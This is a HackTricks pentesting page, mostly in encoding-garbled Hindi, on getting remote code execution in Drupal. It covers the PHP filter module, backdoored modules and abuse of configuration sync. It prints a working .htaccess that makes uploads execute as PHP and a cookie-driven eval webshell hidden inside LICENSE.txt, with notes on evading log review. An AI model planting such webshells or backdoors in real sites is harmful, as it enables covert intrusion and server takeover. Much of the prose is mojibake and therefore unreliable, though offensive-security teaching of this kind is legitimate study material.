# Drupal RCE

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## With PHP Filter Module

{% hint style="warning" %}
рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ Drupal **(рд╕рдВрд╕реНрдХрд░рдг 8 рд╕реЗ рдкрд╣рд▓реЗ)**, рдПрдХ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧ рдЗрди рдХрд░рдирд╛ рдФрд░ **`PHP filter` рдореЙрдбреНрдпреВрд▓ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛**, рдЬреЛ "рд╕рдВрд▓рдЧреНрди PHP рдХреЛрдб/рдЯреБрдХрдбрд╝реЛрдВ рдХреЛ рдореВрд▓реНрдпрд╛рдВрдХрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред" рд▓реЗрдХрд┐рди рд╕рдВрд╕реНрдХрд░рдг 8 рд╕реЗ рдпрд╣ рдореЙрдбреНрдпреВрд▓ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕реНрдерд╛рдкрд┐рдд рдирд╣реАрдВ рд╣реИред
{% endhint %}

1. **/modules/php** рдкрд░ рдЬрд╛рдПрдВ рдФрд░ рдпрджрд┐ 403 рддреНрд░реБрдЯрд┐ рд▓реМрдЯрд╛рдИ рдЬрд╛рддреА рд╣реИ рддреЛ **PHP filter рдкреНрд▓рдЧрдЗрди рд╕реНрдерд╛рдкрд┐рдд рд╣реИ рдФрд░ рдЖрдк рдЬрд╛рд░реА рд░рдЦ рд╕рдХрддреЗ рд╣реИрдВ**
1. рдпрджрд┐ рдирд╣реАрдВ, рддреЛ `Modules` рдкрд░ рдЬрд╛рдПрдВ рдФрд░ `PHP Filter` рдХреЗ рдмреЙрдХреНрд╕ рдкрд░ рдЯрд┐рдХ рдХрд░реЗрдВ рдФрд░ рдлрд┐рд░ `Save configuration` рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ
2. рдлрд┐рд░, рдЗрд╕рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдХреЗ рд▓рд┐рдП, `Add content` рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ, рдлрд┐рд░ `Basic Page` рдпрд╛ `Article` рдЪреБрдиреЗрдВ рдФрд░ **PHP рдмреИрдХрдбреЛрд░** рд▓рд┐рдЦреЗрдВ, рдлрд┐рд░ рдЯреЗрдХреНрд╕реНрдЯ рдкреНрд░рд╛рд░реВрдк рдореЗрдВ `PHP` рдХреЛрдб рдЪреБрдиреЗрдВ рдФрд░ рдЕрдВрдд рдореЗрдВ `Preview` рдЪреБрдиреЗрдВ
3. рдЗрд╕реЗ рд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдмрд╕ рдирдП рдмрдирд╛рдП рдЧрдП рдиреЛрдб рддрдХ рдкрд╣реБрдВрдЪреЗрдВ:
```bash
curl http://drupal.local/node/3
```
## PHP рдлрд╝рд┐рд▓реНрдЯрд░ рдореЙрдбреНрдпреВрд▓ рд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВ

{% hint style="warning" %}
рд╡рд░реНрддрдорд╛рди рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реНрдерд╛рдкрдирд╛ рдХреЗ рдмрд╛рдж рдХреЗрд╡рд▓ рд╡реЗрдм рддрдХ рдкрд╣реБрдБрдЪ рд╣реЛрдиреЗ рдкрд░ рдкреНрд▓рдЧрдЗрдиреНрд╕ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ рдЕрдм рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИред
{% endhint %}

рд╕рдВрд╕реНрдХрд░рдг **8 рд╕реЗ рдЖрдЧреЗ,** [**PHP рдлрд╝рд┐рд▓реНрдЯрд░**](https://www.drupal.org/project/php/releases/8.x-1.1) **рдореЙрдбреНрдпреВрд▓ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕реНрдерд╛рдкрд┐рдд рдирд╣реАрдВ рд╣реИ**ред рдЗрд╕ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ **рдореЙрдбреНрдпреВрд▓ рдХреЛ рд╕реНрд╡рдпрдВ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛**ред

1. Drupal рд╡реЗрдмрд╕рд╛рдЗрдЯ рд╕реЗ рдореЙрдбреНрдпреВрд▓ рдХрд╛ рд╕рдмрд╕реЗ рд╣рд╛рд▓рд┐рдпрд╛ рд╕рдВрд╕реНрдХрд░рдг рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВред
1. `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
2. рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж **`Administration`** > **`Reports`** > **`Available updates`** рдкрд░ рдЬрд╛рдПрдВред
3. **`Browse`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ, рдЙрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реЗ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдЬрд╣рд╛рдБ рд╣рдордиреЗ рдЗрд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдпрд╛ рдерд╛, рдФрд░ рдлрд┐рд░ **`Install`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
4. рдПрдХ рдмрд╛рд░ рдореЙрдбреНрдпреВрд▓ рд╕реНрдерд╛рдкрд┐рдд рд╣реЛ рдЬрд╛рдиреЗ рдкрд░, рд╣рдо **`Content`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдПрдХ рдирдпрд╛ рдмреБрдирд┐рдпрд╛рджреА рдкреГрд╖реНрда рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**, рдЬреИрд╕реЗ рдХрд┐ рд╣рдордиреЗ Drupal 7 рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдХрд┐рдпрд╛ рдерд╛ред рдлрд┐рд░ рд╕реЗ, рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ **`Text format`** рдбреНрд░реЙрдкрдбрд╛рдЙрди рд╕реЗ **`PHP code`** рдХрд╛ рдЪрдпрди рдХрд░реЗрдВред

## рдмреИрдХрдбреЛрд░ рдореЙрдбреНрдпреВрд▓

{% hint style="warning" %}
рд╡рд░реНрддрдорд╛рди рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реНрдерд╛рдкрдирд╛ рдХреЗ рдмрд╛рдж рдХреЗрд╡рд▓ рд╡реЗрдм рддрдХ рдкрд╣реБрдБрдЪ рд╣реЛрдиреЗ рдкрд░ рдкреНрд▓рдЧрдЗрдиреНрд╕ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ рдЕрдм рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИред
{% endhint %}

рдпрд╣ рд╕рдВрднрд╡ рдерд╛ рдХрд┐ **рдПрдХ рдореЙрдбреНрдпреВрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рдЙрд╕рдореЗрдВ **рдмреИрдХрдбреЛрд░** рдЬреЛрдбрд╝реЗрдВ рдФрд░ **рдЗрд╕реЗ рд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВ**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, [**Trurnstile**](https://www.drupal.org/project/turnstile) рдореЙрдбреНрдпреВрд▓ рдХреЛ рд╕рдВрдХреБрдЪрд┐рдд рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛, рдЗрд╕рдХреЗ рдЕрдВрджрд░ рдПрдХ рдирдпрд╛ PHP рдмреИрдХрдбреЛрд░ рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдирд╛, рдЬрд┐рд╕рд╕реЗ `.htaccess` рдлрд╝рд╛рдЗрд▓ рдХреЗ рд╕рд╛рде PHP рдлрд╝рд╛рдЗрд▓ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА:
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
And then going to **`http://drupal.local/admin/modules/install`** to install the backdoored module and access **`/modules/turnstile/back.php`** to execute it.

## Backdooring Drupal with Configuration synchronization <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Post shared by** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### Part 1 (activation of _Media_ and _Media Library_)

In the _Extend_ menu (/admin/modules), you can activate what appear to be plugins already installed. By default, plugins _Media_ and _Media Library_ donтАЩt appear to be activated, so letтАЩs activate them.

Before activation:

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

After activation:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Part 2 (leveraging feature _Configuration synchronization_) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

WeтАЩll leverage the _Configuration synchronization_ feature to dump (export) and upload (import) Drupal configuration entries:

* /admin/config/development/configuration/single/export
* /admin/config/development/configuration/single/import

**Patch system.file.yml**

LetтАЩs start by patching the first entry `allow_insecure_uploads` from:

File: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

рдХреЗ рд▓рд┐рдП:

рдлрд╛рдЗрд▓: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Patch field.field.media.document.field\_media\_document.yml**

рдлрд┐рд░, рджреВрд╕рд░реЗ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ `file_extensions` рдХреЛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдкреИрдЪ рдХрд░реЗрдВ:

File: field.field.media.document.field\_media\_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

рдХреЗ рд▓рд┐рдП:

рдлрд╛рдЗрд▓: field.field.media.document.field\_media\_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> рдореИрдВ рдЗрд╕реЗ рдЗрд╕ рдмреНрд▓реЙрдЧрдкреЛрд╕реНрдЯ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░рддрд╛, рд▓реЗрдХрд┐рди рдпрд╣ рдиреЛрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдЗрд╕реЗ рдордирдорд╛рдиреЗ рддрд░реАрдХреЗ рд╕реЗ `file_directory` рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдФрд░ рдпрд╣ рдПрдХ рдкрде traversal рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИ (рдЗрд╕рд▓рд┐рдП рд╣рдо Drupal рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдкреЗрдбрд╝ рдХреЗ рднреАрддрд░ рд╡рд╛рдкрд╕ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ)ред

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### рднрд╛рдЧ 3 (рд╡рд┐рд╢реЗрд╖рддрд╛ _Add Document_ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдирд╛) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

рдЕрдВрддрд┐рдо рдХрджрдо рд╕рдмрд╕реЗ рд╕рд░рд▓ рд╣реИ, рдФрд░ рдЗрд╕реЗ рджреЛ рдЙрдк-рдЪрд░рдгреЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдкрд╣рд▓рд╛ рд╣реИ .htaccess рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░рдирд╛ рддрд╛рдХрд┐ Apache рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ .txt рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ PHP рдЗрдВрдЬрди рджреНрд╡рд╛рд░рд╛ рд╡реНрдпрд╛рдЦреНрдпрд╛рдпрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛ рд╕рдХреЗред рджреВрд╕рд░рд╛ рд╣реИ рд╣рдорд╛рд░реА рдкреЗрд▓реЛрдб рд╡рд╛рд▓реА .txt рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░рдирд╛ред

File: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
рдХреНрдпреЛрдВ рдпрд╣ рдЯреНрд░рд┐рдХ рдХреВрд▓ рд╣реИ?

рдХреНрдпреЛрдВрдХрд┐ рдПрдХ рдмрд╛рд░ рдЬрдм Webshell (рдЬрд┐рд╕реЗ рд╣рдо LICENSE.txt рдХрд╣реЗрдВрдЧреЗ) рд╡реЗрдм рд╕рд░реНрд╡рд░ рдкрд░ рдбреНрд░реЙрдк рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╣рдо рдЕрдкрдиреЗ рдХрдорд╛рдВрдб `$_COOKIE` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЯреНрд░рд╛рдВрд╕рдорд┐рдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╡реЗрдм рд╕рд░реНрд╡рд░ рд▓реЙрдЧ рдореЗрдВ, рдпрд╣ рдПрдХ рд╡реИрдз GET рдЕрдиреБрд░реЛрдз рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рдЯреЗрдХреНрд╕реНрдЯ рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛ред

рд╣рдорд╛рд░реЗ Webshell рдХрд╛ рдирд╛рдо LICENSE.txt рдХреНрдпреЛрдВ рд░рдЦрд╛ рдЬрд╛рдП?

рд╕рд┐рд░реНрдл рдЗрд╕рд▓рд┐рдП рдХреНрдпреЛрдВрдХрд┐ рдЕрдЧрд░ рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдлрд╝рд╛рдЗрд▓ рд▓реЗрддреЗ рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (рдЬреЛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА Drupal рдХреЛрд░ рдореЗрдВ рдореМрдЬреВрдж рд╣реИ), рддреЛ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ 339 рд▓рд╛рдЗрдиреЛрдВ рдФрд░ 17.6 KB рдЖрдХрд╛рд░ рдХреА рдПрдХ рдлрд╝рд╛рдЗрд▓ рд╣реИ, рдЬреЛ рдмреАрдЪ рдореЗрдВ рдПрдХ рдЫреЛрдЯрд╛ PHP рдХреЛрдб рд╕реНрдирд┐рдкреЗрдЯ рдЬреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХрджрдо рд╕рд╣реА рд╣реИ (рдХреНрдпреЛрдВрдХрд┐ рдлрд╝рд╛рдЗрд▓ рдХрд╛рдлреА рдмрдбрд╝реА рд╣реИ)ред 

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

рдлрд╝рд╛рдЗрд▓: рдкреИрдЪ рдХрд┐рдпрд╛ рдЧрдпрд╛ LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **рднрд╛рдЧ 3.1 (рдлрд╛рдЗрд▓ .htaccess рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ)**

рдкрд╣рд▓реЗ, рд╣рдо _Add Document_ (/media/add/document) рд╕реБрд╡рд┐рдзрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдкрдиреА рдлрд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ Apache рдирд┐рд░реНрджреЗрд╢ (.htaccess) рд╣реЛрддреЗ рд╣реИрдВред

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**рднрд╛рдЧ 3.2 (рдлрд╛рдЗрд▓ LICENSE.txt рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ)**

рдлрд┐рд░, рд╣рдо _Add Document_ (/media/add/document) рд╕реБрд╡рд┐рдзрд╛ рдХрд╛ рдлрд┐рд░ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдПрдХ рд▓рд╛рдЗрд╕реЗрдВрд╕ рдлрд╛рдЗрд▓ рдХреЗ рднреАрддрд░ рдЫрд┐рдкрд╛ рд╣реБрдЖ Webshell рдЕрдкрд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

<figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

### рднрд╛рдЧ 4 (Webshell рдХреЗ рд╕рд╛рде рдЗрдВрдЯрд░реИрдХреНрд╢рди) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

рдЕрдВрддрд┐рдо рднрд╛рдЧ Webshell рдХреЗ рд╕рд╛рде рдЗрдВрдЯрд░реИрдХреНрдЯ рдХрд░рдиреЗ рдХрд╛ рд╣реИред

рдЬреИрд╕рд╛ рдХрд┐ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░реАрдирд╢реЙрдЯ рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдпрджрд┐ рд╣рдорд╛рд░реЗ Webshell рджреНрд╡рд╛рд░рд╛ рдЕрдкреЗрдХреНрд╖рд┐рдд рдХреБрдХреА рдкрд░рд┐рднрд╛рд╖рд┐рдд рдирд╣реАрдВ рд╣реИ, рддреЛ рд╣рдо рд╡реЗрдм рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдлрд╛рдЗрд▓ рдкрд░ рдкрд░рд╛рдорд░реНрд╢ рдХрд░рддреЗ рд╕рдордп рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрд░рд┐рдгрд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВред

<figure><img src="../../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

рдЬрдм рд╣рдорд▓рд╛рд╡рд░ рдХреБрдХреА рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИ, рддреЛ рд╡рд╣ Webshell рдХреЗ рд╕рд╛рде рдЗрдВрдЯрд░реИрдХреНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЬреЛ рдЪрд╛рд╣реЗрдВ рдЖрджреЗрд╢ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

<figure><img src="../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

рдФрд░ рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рд▓реЙрдЧ рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдХреЗрд╡рд▓ рдПрдХ txt рдлрд╛рдЗрд▓ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

<figure><img src="../../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

рдЗрд╕ рд▓реЗрдЦ рдХреЛ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдзрдиреНрдпрд╡рд╛рдж, рдореБрдЭреЗ рдЙрдореНрдореАрдж рд╣реИ рдХрд┐ рдпрд╣ рдЖрдкрдХреЛ рдХреБрдЫ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░реЗрдЧрд╛ред

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **HackTricks рдФрд░ HackTricks Cloud github repos рдореЗрдВ PRs рдЬрдорд╛ рдХрд░рдХреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>
{% endhint %}
